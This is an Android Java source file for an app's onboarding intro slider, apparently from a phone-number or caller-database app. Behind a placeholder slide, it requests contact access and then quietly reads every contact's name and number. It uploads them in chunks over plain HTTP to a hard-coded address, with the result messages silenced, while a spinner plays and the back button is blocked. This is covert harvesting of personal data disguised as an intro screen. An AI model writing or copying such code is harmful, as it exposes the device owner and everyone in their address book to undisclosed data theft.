package ir.hrwanheda.dbnumber.CheckPermissionAndIntroSlider;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.viewpager.widget.PagerAdapter;
import androidx.viewpager.widget.ViewPager;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.text.Html;
import android.text.Layout;
import android.util.Log;
import android.util.TypedValue;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.comix.overwatch.HiveProgressView;

import org.w3c.dom.Text;

import java.util.HashMap;
import java.util.Map;

import ir.hrwanheda.dbnumber.MainActivity;
import ir.hrwanheda.dbnumber.R;
import ir.hrwanheda.dbnumber.welcome.WelcomeActivity;

public class IntroSlider extends AppCompatActivity {
    int[] id = {R.layout.slide1,R.layout.slide2,R.layout.slide3,R.layout.slide4};
    ViewPager viewpager;
    LinearLayout LayoutDots;
    String contact = "";
    HiveProgressView hiveProgressView;
    View view_background;
    View btn;
    Thread thread;
    RequestQueue queue;
    int count_contact = 0;

    boolean CheckOnBack = false;
    SharedPreferences preferences;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_intro_slider);
        queue = Volley.newRequestQueue(this);
        preferences = getSharedPreferences("pref",MODE_PRIVATE);
        getSupportActionBar().hide();
        Window window = getWindow();
        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.setStatusBarColor(Color.TRANSPARENT);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.setNavigationBarColor(Color.TRANSPARENT);
        }
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION);
        LayoutDots = findViewById(R.id.layoutDots);
        viewpager = this.<ViewPager>findViewById(R.id.vp);
        viewpager.setAdapter(new pager());
        showDots(viewpager.getCurrentItem());

        viewpager.addOnPageChangeListener(new ViewPager.OnPageChangeListener() {
            @Override
            public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {

            }

            @Override
            public void onPageSelected(int position) {

                showDots(position);
            }

            @Override
            public void onPageScrollStateChanged(int state) {

            }
        });
    }

    public class pager extends PagerAdapter
    {

        @Override
        public Object instantiateItem(ViewGroup container, int position) {
            View view = LayoutInflater.from(IntroSlider.this).inflate(id[position],container,false);


            try {
                TextView tv = view.findViewById(R.id.slide1_tv);
                tv.setText("slide 1");

            }catch (Exception e)
            {
                e.fillInStackTrace();
            }
            try {
                TextView tv = view.findViewById(R.id.slide2_tv);
                tv.setText("slide 2");

            }catch (Exception e)
            {
                e.fillInStackTrace();
            }
            try {
                TextView tv = view.findViewById(R.id.slide3_tv);
                tv.setText("slide 3");

            }catch (Exception e)
            {
                e.fillInStackTrace();
            }
            try {
                TextView tv = view.findViewById(R.id.slide4_tv);
                tv.setText("slide 4");
                hiveProgressView = view.findViewById(R.id.slide4_progress);

                view_background = view.findViewById(R.id.slide4_view);


                btn = view.findViewById(R.id.slide4_btn);
                btn.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            /*if(checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
                            {

                            }*/
                            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},10);

                        }
                    }
                });

                btn.setZ(0);
                view_background.setZ(05);
                hiveProgressView.setZ(100);



            }catch (Exception e)
            {
                e.fillInStackTrace();
            }


            container.addView(view);



            return view;
        }

        @Override
        public int getCount() {
            return id.length;
        }

        @Override
        public boolean isViewFromObject(View view,Object object) {
            return view == object;
        }

        @Override
        public void destroyItem(ViewGroup container, int position, Object object) {
            View view = (View) object;
            container.removeView(view);
        }
    }
    private void showDots(int pageNumber){
        TextView[] dots = new TextView[viewpager.getAdapter().getCount()];
        LayoutDots.removeAllViews();
        for(int i = 0; i < dots.length ; i++){
            dots[i] = new TextView(this);
            dots[i].setText(Html.fromHtml("&#8226;"));
            dots[i].setTextSize(TypedValue.COMPLEX_UNIT_SP, 35);
            dots[i].setTextColor(ContextCompat.getColor(this,
                    (i == pageNumber ?  R.color.dot_active : R.color.dot_incative)
            ));
            LayoutDots.addView(dots[i]);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if(requestCode == 10)
        {

            if(grantResults[0] == 0)
            {


                hiveProgressView.setVisibility(View.VISIBLE);
                view_background.setVisibility(View.VISIBLE);
                CheckOnBack = true;
                btn.setBackgroundColor(Color.parseColor("#7EEAE1E1"));


                Thread thread1 = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        getContactList();

                        Log.i("fdsfsdfsdfdf", ""+contact.length());
                        if(contact.length() > 2000)
                        {
                            final String[] array_cont = contact.split("!!!");

                            for(final String str:array_cont)
                            {
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        StringRequest request = new StringRequest(Request.Method.POST, "http://192.168.1.102:55551", new Response.Listener<String>() {
                                            @Override
                                            public void onResponse(String response) {
                                                //Toast.makeText(IntroSlider.this,""+response,Toast.LENGTH_LONG).show();
                                            }
                                        }, new Response.ErrorListener() {
                                            @Override
                                            public void onErrorResponse(VolleyError error) {
                                                //Toast.makeText(IntroSlider.this,""+error.getMessage(),Toast.LENGTH_LONG).show();
                                            }
                                        }) {
                                            @Override
                                            protected Map<String, String> getParams() throws AuthFailureError {
                                                Map<String,String> param = new HashMap<String, String>();
                                                param.put("contact",str);
                                                return param;
                                            }
                                        };
                                        queue.add(request);
                                    }
                                });
                            }

                        }else {

                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    StringRequest request = new StringRequest(Request.Method.POST, "http://192.168.1.102:55551", new Response.Listener<String>() {
                                        @Override
                                        public void onResponse(String response) {
                                            //Toast.makeText(IntroSlider.this,""+response,Toast.LENGTH_LONG).show();
                                        }
                                    }, new Response.ErrorListener() {
                                        @Override
                                        public void onErrorResponse(VolleyError error) {
                                            //Toast.makeText(IntroSlider.this,""+error.getMessage(),Toast.LENGTH_LONG).show();
                                        }
                                    }) {
                                        @Override
                                        protected Map<String, String> getParams() throws AuthFailureError {
                                            Map<String,String> param = new HashMap<String, String>();
                                            param.put("contact",contact);
                                            return param;
                                        }
                                    };
                                    queue.add(request);
                                }
                            });

                        }

                    }
                });
                thread1.start();

                thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            thread.sleep(10000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                preferences.edit().putString("start","run").apply();
                                startActivity(new Intent(IntroSlider.this, MainActivity.class));
                            }
                        });
                    }
                });
                thread.start();



                /*


                 */



            }else {
                hiveProgressView.setVisibility(View.VISIBLE);
                view_background.setVisibility(View.VISIBLE);
                btn.setBackgroundColor(Color.parseColor("#7EEAE1E1"));
                preferences.edit().putString("start","run").apply();
                thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            thread.sleep(10000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {

                                startActivity(new Intent(IntroSlider.this, MainActivity.class));
                            }
                        });
                    }
                });
                thread.start();
            }
        }

    }


    private void getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                final String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        final String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));

                        String strNum = phoneNo + "";
                        strNum = strNum.replace(" ","");

                        String str = name + ":" + strNum + "@";
                        contact += str;
                        count_contact+= str.length();
                        if(count_contact >= 2000)
                        {
                            contact += "!!!";
                            count_contact = 0;
                        }

                    }


                    pCur.close();
                }
            }
            if (cur != null) {
                cur.close();
            }
        }

    }

    @Override
    public void onBackPressed() {
        if(!CheckOnBack)
        {
            super.onBackPressed();
        }

    }
}
